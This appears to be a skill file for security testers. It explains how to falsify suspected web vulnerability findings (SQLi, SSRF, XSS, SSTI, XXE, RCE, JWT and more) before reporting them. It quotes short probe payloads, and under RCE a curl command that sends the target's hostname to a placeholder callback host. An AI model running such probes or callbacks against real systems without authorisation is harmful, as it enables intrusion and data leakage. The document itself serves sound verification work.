---
name: red-team-the-finding
description: Challenge your own finding before reporting it — per-class falsification moves, assumption-surfacing, and the single-fact-that-disproves-it discipline.
---

# Red-Team the Finding

Before reporting a finding, build the strongest case that it is
*not* exploitable. This is not a formality — it is the methodology
that separates confirmed findings from confident-sounding false
positives. The closure discipline in `analysis/counterevidence`
governs what counts as proof of safety; this skill governs how to
*actively seek* that counterevidence for each vulnerability class.

The per-class falsification move is the single test that would
disprove the finding if it failed. Every finding gets one before it
is reported.

## The Procedure

### 1. State the claim

Write down, in one sentence, what the finding claims:

> "The `/api/users/{id}` endpoint returns other users' records when
> the `id` parameter is swapped, because no authorization check
> binds the object to the caller."

The finding is the claim. Everything below tests it.

### 2. Identify the single fact that disproves it

For every finding, there is one fact that, if true, makes the
finding false. Name it:

> "The response body for a foreign `id` contains only the caller's
> own data, not the target's." (auto-scoping)

> "The `SLEEP(5)` produces no delay on repeated retries." (timing
> noise, not SQLi)

> "The OAST callback source IP matches the tester's machine, not
> the target's egress." (client-side fetch, not SSRF)

### 3. Test for it

Execute the test that would reveal this fact. If the fact holds,
the finding is false. If it does not, the finding survives one
round of falsification.

### 4. Surface assumptions

List every assumption the finding rests on:

- "The endpoint is internet-reachable" — confirmed how?
- "The session is low-privilege" — verified against what role model?
- "The database is MySQL" — fingerprinted by what signal?
- "The file exists at that path" — read confirmed or inferred?

Each assumption is a potential falsification point. Test as many as
scope and budget allow.

## Per-Class Falsification Moves

The falsification move is the specific test that disproves the
class-specific claim. If you can only run one counter-test, run
this one.

### SQL Injection

**Claim**: user input reaches a SQL sink and the oracle (boolean,
time, error, OAST) confirms evaluation.

**Falsification move**: swap the payload for a syntactically
different one that should produce the *opposite* oracle response.
If `AND 1=1` returns X, `AND 1=2` must return Y (different from X,
consistently across ≥3 retries). If `SLEEP(5)` adds 5s, `SLEEP(1)`
must add ~1s and `SLEEP(0)` must add ~0s. A single oracle response
that does not scale or pair is not confirmed — it may be timing
noise, a WAF block, or a generic error.

**Also check**: is the source IP on the OAST callback the target's
egress, not the tester's?

### SSRF

**Claim**: the server emits an outbound request to an
attacker-controlled destination.

**Falsification move**: compare the OAST callback's source IP to
the target's known egress IP. If it matches the tester's browser IP,
the fetch is client-side (JavaScript), not server-side. Also submit
a non-URL value and confirm the callback does *not* arrive — if it
does, the endpoint is not URL-dependent.

### IDOR / BOLA

**Claim**: swapping the object identifier returns another user's
data.

**Falsification move**: compare the response body's identifier and
owner fields against the target account's known values, not just
against the caller's. If the response contains the caller's own
data (auto-scoping), the server silently redirected the request.
If the response is empty/null, check whether the owner's own
request returns data for that ID — if the owner also gets empty,
the object does not exist.

### XSS

**Claim**: injected script executes in the victim's browser context.

**Falsification move**: check whether CSP, Trusted Types, or
DOMPurify blocks execution. A reflected payload that appears in the
DOM but does not execute (CSP nonce mismatch, Trusted Types sink
rejection) is not a finding. Verify execution with a callback
(OAST, `document.location`, `fetch` to controlled endpoint), not
just DOM presence.

### CSRF

**Claim**: a cross-origin request performs a state change under the
victim's identity.

**Falsification move**: after submitting the CSRF PoC, verify the
state change with a *separate read request* from the victim's
session. A 200 response to the POST does not prove state change —
the server may have silently rejected it (missing CSRF token in
header). Also verify the PoC runs from a genuinely cross-origin
host, not the target's own domain.

### SSTI

**Claim**: template syntax is evaluated server-side.

**Falsification move**: submit `{{7*7}}` and check whether the
response contains `49` (evaluated) or `{{7*7}}` (reflected
literally). If reflected literally, the finding is not SSTI — it may
be client-side template injection (XSS impact, not RCE) or simple
reflection. Confirm server-side evaluation with a non-HTML probe
that rules out XSS-shaped reflection.

### Race Conditions

**Claim**: concurrent requests produce duplicate state changes or
invariant violations.

**Falsification move**: repeat the test N times (≥10). A single
success may be a benign interleaving. If the success rate is
<10% across repeated trials, the race is not reliably exploitable
— report as low-confidence or informational. Also verify the state
change is durable (not a visual-only glitch).

### Path Traversal / LFI

**Claim**: the traversal payload reads a file from the filesystem.

**Falsification move**: compare the response body against the known
content of the target file (e.g., `/etc/passwd` has a known
structure). If the response echoes the *payload* but not the *file
content*, the endpoint is reflecting input, not reading files. If
the response is empty on both traversal and control probes, the
endpoint may be returning 200 by default.

### Insecure Deserialization

**Claim**: the deserializer executes a gadget chain.

**Falsification move**: distinguish parser liveness from code
execution. A DNS/HTTP callback from a URLDNS payload proves the
parser ran and egress is open — it does not prove RCE. The RCE edge
requires a safe side-effect from an *exec* payload (file creation,
distinct callback with embedded nonce). Also verify the blob is not
signed/encrypted with an uncompromised key.

### XXE

**Claim**: the XML parser resolves external entities.

**Falsification move**: submit a DOCTYPE with a distinct entity
reference (`&test;` defined as `<!ENTITY test "MARKER">`) and check
whether `MARKER` appears in the response. If the response contains
the DOCTYPE fragment literally (the parser echoed the input), that
is parameter reflection, not entity resolution. Also confirm
HTTP fetch (not just DNS resolution) with an HTTP-only OAST endpoint.

### Open Redirect

**Claim**: the application redirects to an attacker-controlled
destination.

**Falsification move**: check whether the redirect target is
constrained to relative same-origin paths. If the redirect rewrites
the target to a relative path (strips scheme+host), the redirect is
not exploitable for phishing. Also check whether the 302 Location
contains the payload or a sanitized version.

### Broken Function-Level Authorization

**Claim**: a low-privilege user can invoke a privileged endpoint.

**Falsification move**: verify the response is not a 2xx-empty
(silent enforcement). Confirm the state change actually occurred
by reading the affected resource from a privileged session. If the
endpoint returns 200 but the state did not change, the server
accepted the request syntactically but did not act on it.

### Mass Assignment

**Claim**: binding an extra field in the request body changes a
protected attribute.

**Falsification move**: read the object back after the write and
verify the protected field actually changed. Many frameworks
accept the extra field in the request but recompute it from the
authoritative source before persisting. If the returned object
shows the field but the database row does not, the assignment was
client-side only.

### RCE

**Claim**: user input reaches a command or code execution sink and
produces attacker-controlled behavior.

**Falsification move**: distinguish a crash or timeout from
controlled execution. If the only evidence is a timeout or a
generic 500, the sink may have crashed without executing attacker
code — this is the most common RCE false positive. Verify
controlled behavior: an OAST callback with an embedded nonce from a
distinct command (`curl http://<oast>/$(hostname)`), or a unique
marker file written to `/tmp/` and read back. Also verify the
execution is not sandboxed — a restricted VM with no I/O or
process spawn, or a filtered command subset that rejects
attacker-controlled arguments, is effective mitigation.

**Also check**: is the OAST callback from the target's egress IP,
not the tester's? Is the output from the target's environment
(hostname, user), not local?

### Authentication / JWT

**Claim**: a forged, modified, or misused token is accepted by the
server as valid authentication or authorization.

**Falsification move**: verify the token is accepted for a
*protected operation*, not just syntactically parsed. A 200
response does not prove acceptance if the response body is empty
or masked (middleware may redact admin responses while still
enforcing authorization). Send the modified token to an endpoint
that returns user-specific data and confirm the response reflects
the claimed identity. Also verify you are not testing a
mock/development verifier that accepts any signature in
non-production environments.

**Also check**: does the server enforce audience and issuer? A token
accepted by one service but rejected by the target service is not a
cross-service confusion finding — it is strict audience enforcement.

## After Falsification

If the finding survives:
- Record what you tested in the finding's `counterevidence` field.
- State the assumptions you could not test.
- Set `confidence` based on what was demonstrated vs inferred.

If the finding fails:
- Close the candidate as `ruled_out` with the named control.
- If the finding partially fails (one edge breaks but the
  standalone primitive is real), downgrade the chain but keep the
  primitive.

Cross-reference: `validation/blind_revalidation` for fresh-session
re-test discipline. `validation/fp_taxonomy` for the cross-class FP
shapes. `validation/negative_control_design` for the baseline that
must not trigger. `analysis/counterevidence` for the closure
discipline.
